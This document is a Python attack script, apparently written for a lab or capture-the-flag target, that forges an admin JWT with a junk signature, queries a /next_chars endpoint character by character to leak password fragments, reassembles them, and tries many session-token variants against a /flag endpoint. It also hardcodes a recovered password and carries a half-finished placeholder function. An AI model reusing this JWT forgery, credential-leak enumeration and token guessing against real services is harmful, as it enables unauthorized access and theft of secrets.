#!/usr/bin/env python3
import base64, json, time, string, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode().rstrip("=")

SECRET = "77.204.214.64"   # update if lab reset again
MAGIC = "magic-key.hkn"

# 1) Forge a FRESH JWT right now
header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"
print(f"[1] Fresh JWT: {jwt}")

# 2) Walk the FULL chain right now using this fresh JWT, build a char->fragments map
print("[2] Walking /next_chars chain on secret-server with fresh JWT...")
frag_map = {}
for c in string.printable:
    if c in "\n\r\t\x0b\x0c":
        continue
    try:
        r = requests.get(f"http://{SECRET}/next_chars", params={"char": c}, headers={"JWT": jwt}, timeout=4)
        if r.status_code == 200:
            try:
                arr = json.loads(r.text)
            except json.JSONDecodeError:
                arr = []
            if arr and arr != [""]:
                frag_map[c] = arr
    except requests.exceptions.RequestException:
        pass

print(f"    Found {len(frag_map)} chars with fragments.")

# 3) Reconstruct via simple greedy walk starting from the char whose fragment never
#    appears as a continuation of another (heuristic: just use known structure).
#    We already know the shape is pwd:XXXX... so reconstruct generically:
#    Find start candidate: a char c such that no fragment in frag_map starts with "?c" pattern easily.
#    Simpler: just print the map so we can sanity check, then reconstruct both with and without "pwd:" prefix.
print("[3] Fragment map:")
for c, arr in frag_map.items():
    print(f"    {c!r} -> {arr}")

# Try to walk starting from 'p' if present (matches prior known structure), else just report map.
def walk(start_char):
    result = start_char
    cur = start_char
    visited_steps = 0
    while visited_steps < 50:
        options = frag_map.get(cur)
        if not options:
            break
        # pick fragment overlapping with end of result if possible
        chosen = None
        for opt in options:
            if opt == "":
                chosen = ""
                break
            tail = result[-2:] if len(result) >= 2 else result
            if opt.startswith(tail):
                chosen = opt
                break
        if chosen is None:
            chosen = options[0]
        if chosen == "":
            break
        result += chosen[len(result) - (len(result) - 0):]  # placeholder, fixed below
        # Properly: append only the NEW character(s) not already overlapping
        break
    return result

# Simpler robust reconstruction: BFS/greedy using overlap of 2 chars like before
def reconstruct(frag_map, start):
    seq = start
    cur_char = start
    for _ in range(60):
        opts = frag_map.get(cur_char)
        if not opts:
            break
        tail2 = seq[-2:]
        pick = None
        for o in opts:
            if o == "":
                pick = ""
                break
            if o.startswith(tail2) or len(seq) < 2:
                pick = o
                break
        if pick is None:
            pick = opts[0]
        if pick == "":
            break
        # advance by the non-overlapping suffix (1 new char typically)
        new_part = pick[len(tail2):] if pick.startswith(tail2) else pick
        seq += new_part
        cur_char = seq[-1]
    return seq

start_candidates = [c for c in frag_map if c not in "".join("".join(v) for v in frag_map.values())]
print(f"[4] Possible start chars (not appearing inside any fragment): {start_candidates}")

for start in (start_candidates or list(frag_map.keys())[:3]):
    rec = reconstruct(frag_map, start)
    print(f"    Reconstructed from start={start!r}: {rec!r}")

# 4) Take the best-known reconstruction (fallback to previously known value) and test IMMEDIATELY
candidates_to_test = set()
for start in (start_candidates or list(frag_map.keys())[:3]):
    candidates_to_test.add(reconstruct(frag_map, start))
candidates_to_test.add("pwd:C%{6bSUAs52sI@$K8Ouk0")
candidates_to_test.add("C%{6bSUAs52sI@$K8Ouk0")

print(f"\n[5] Testing {len(candidates_to_test)} candidate strings against magic-key.hkn IMMEDIATELY...")
for cand in candidates_to_test:
    for val, label in [(cand, "plain"), (b64(cand), "base64")]:
        for extra in ({}, {"URL-Maybe": "/flag"}, {"URL": "/flag"}):
            headers = {"Session-Token": val, **extra}
            for path in ("/flag", "/next_chars"):
                params = {"char": "s"} if path == "/next_chars" else None
                r = requests.get(f"http://{MAGIC}{path}", params=params, headers=headers, timeout=4)
                if r.status_code != 401:
                    print(f"!!! HIT: cand={cand!r} enc={label} extra={extra} path={path} -> {r.status_code}: {r.text[:300]}")

print("\nDone.")
